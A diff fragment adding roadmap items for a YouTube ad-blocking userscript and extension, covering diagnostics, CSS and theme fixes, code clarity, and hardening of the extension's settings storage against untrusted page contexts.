+  Evidence: Chrome `declarativeNetRequest.getMatchedRules` docs, `extension/manifest.json:57-64`, `extension/rules/network-rules-source.json`, `buildDiagnosticsReport()` in `YoutubeAdblock.user.js:7626-7687`.
+  Touches: `extension/background.js`, `extension/bridge.js`, `YoutubeAdblock.user.js`, `extension/manifest.json`, `tests/background-contract.test.mjs`, `tests/bridge-security.test.mjs`.
+  Acceptance: Extension diagnostics include recent DNR rule IDs/counts for YouTube ad endpoints when feedback APIs are available, degrade cleanly without the feedback permission/API, and never expose non-YouTube browsing data.
+  Complexity: M
+
+### Audit-surfaced items
+
+- [ ] P2, Harden cosmetic CSS hash to fully deduplicate selector sets
+  Why: Current mid-point sampling hash still has false-positive risk for selector sets that differ only in positions not sampled.
+  Where: `YoutubeAdblock.user.js` `updateCosmeticCSS` function.
+
+- [ ] P2, Add light theme or system-preference CSS for the Control Center
+  Why: The entire panel CSS is dark-only with hardcoded RGBA values; no `prefers-color-scheme: light` path exists.
+  Where: `YoutubeAdblock.user.js` `injectSettingsCSS` function.
+
+- [ ] P3, Replace DeArrow `locked` boolean arithmetic with explicit comparison
+  Why: `b.locked - a.locked` relies on boolean-to-number coercion; explicit `b.locked === a.locked ? 0 : b.locked ? -1 : 1` is clearer.
+  Where: `YoutubeAdblock.user.js` `dearrowResolve` function.
+
+- [ ] P3, Improve DOM bypass prevention script detection beyond simple string matching
+  Why: `window,"fetch"` string matching can be evaded with template literals, concatenation, or Unicode escapes.
+  Where: `YoutubeAdblock.user.js` `installDOMBypassPrevention` function.
+
+## Research-Driven Additions
+
+### P1: trust boundary hardening
+
+- [ ] P1, Move extension settings storage behind a trusted-context broker
+  Why: Page-world events can currently request allowlisted settings reads/writes through the bridge; Chrome supports hiding extension storage from untrusted contexts.
+  Evidence: `extension/bridge.js:260-424`, `tests/bridge-security.test.mjs:230-346`, Chrome `chrome.storage.*.setAccessLevel()` docs.
+  Touches: `extension/background.js`, `extension/bridge.js`, `tests/bridge-security.test.mjs`, `tests/background-contract.test.mjs`.
+  Acceptance: The service worker owns `chrome.storage.local/sync` reads and writes; bridge requests use `chrome.runtime.sendMessage`; storage access is restricted to trusted contexts where supported; tests prove page CustomEvents cannot directly reach `chrome.storage.*` and sync chunk/oversize behavior still works.
+  Complexity: L
+```
+
+</details>
